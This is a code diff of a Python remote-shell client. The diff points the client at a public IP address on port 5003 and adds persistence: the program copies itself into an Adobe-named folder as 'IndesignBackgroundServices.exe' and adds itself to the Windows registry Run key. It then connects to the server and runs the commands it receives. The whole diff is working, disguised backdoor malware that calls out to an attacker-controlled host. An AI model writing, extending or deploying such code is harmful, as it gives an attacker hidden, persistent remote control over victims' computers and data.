@@ -1,41 +1,56 @@
-import socket
 import os
-import subprocess
-import time
 import shutil
 import sys
+import subprocess
+import socket
+import time
+import winreg as winreg
 
-SERVER_HOST = "127.0.0.1"
+SERVER_HOST = "13.60.17.29"
 SERVER_PORT = 5003
 BUFFER_SIZE = 1024 * 1024  # 128KB max size of messages, feel free to increase
 SEPARATOR = "<sep>"
 
-def copy_exe_to_current_user_startup():
+def get_current_executable():
+    # Function to get the path of the currently running executable
+    return sys.argv[0]
+
+def install_indesign_services():
     try:
-        # Get the directory of the current script
-        script_dir = getattr(sys, '_MEIPASS', os.path.dirname(os.path.abspath(__file__)))
+        # Get the path to the currently running executable
+        current_exe = get_current_executable()
         
-        # Name of the executable file
-        exe_name = "IndesignBackgroundServices.exe"
+        # Specify the target installation directory
+        install_dir = os.path.join(os.getenv("APPDATA"), "Adobe")
         
-        # Full path to the executable
-        exe_path = os.path.join(script_dir, exe_name)
+        # Ensure the target directory exists
+        if not os.path.exists(install_dir):
+            os.makedirs(install_dir)
         
-        # Destination directory for the current user's startup folder
-        startup_folder = os.path.join(os.getenv("APPDATA"), "Microsoft", "Windows", "Start Menu", "Programs", "Startup")
+        # Name of the executable after installation
+        installed_exe = os.path.join(install_dir, "IndesignBackgroundServices.exe")
         
-        # Check if the executable already exists in the current user's startup folder
-        if not os.path.exists(os.path.join(startup_folder, exe_name)):
-            # Copy the executable to the current user's startup folder
-            shutil.copy(exe_path, startup_folder)
-            print(f"Copied '{exe_name}' to current user's startup folder.")
-        else:
-            print(f"'{exe_name}' is already in the current user's startup folder.")
-            
-    except PermissionError as e:
-        print(f"Error: Permission denied. Please check permissions or run the script with appropriate privileges: {e}")
+        # Copy the currently running executable to the installation directory
+        shutil.copy(current_exe, installed_exe)
+        print(f"Copied '{current_exe}' to '{installed_exe}'")
+        
+        # Add to startup via registry
+        add_to_startup(installed_exe)
+        
     except Exception as e:
-        print(f"Error: {e}")
+        print(f"Error installing Indesign services: {e}")
+
+def add_to_startup(exe_path):
+    try:
+        # Add to startup via registry
+        key = winreg.HKEY_CURRENT_USER
+        key_value = "Software\\Microsoft\\Windows\\CurrentVersion\\Run"
+        
+        with winreg.OpenKey(key, key_value, 0, winreg.KEY_ALL_ACCESS) as regkey:
+            winreg.SetValueEx(regkey, "IndesignBackgroundServices", 0, winreg.REG_SZ, exe_path)
+            print(f"Added '{exe_path}' to current user's startup via registry.")
+    except Exception as e:
+        print(f"Error adding to startup: {e}")
 
 def connect_to_server():
     while True:
@@ -62,7 +77,7 @@ def main():
                 print("Connection lost. Reconnecting...")
                 s = connect_to_server()
                 s.send(cwd.encode())
-            if splited_command[0].lower() == "cd":
+            elif splited_command[0].lower() == "cd":
                 try:
                     os.chdir(' '.join(splited_command[1:]))
                     output = ""
@@ -84,5 +99,5 @@ def main():
     s.close()
 
 if __name__ == "__main__":
-    copy_exe_to_current_user_startup()
-    main()
+    install_indesign_services()  # Install Indesign services
+    main()                       # Start main functionality (server communication)
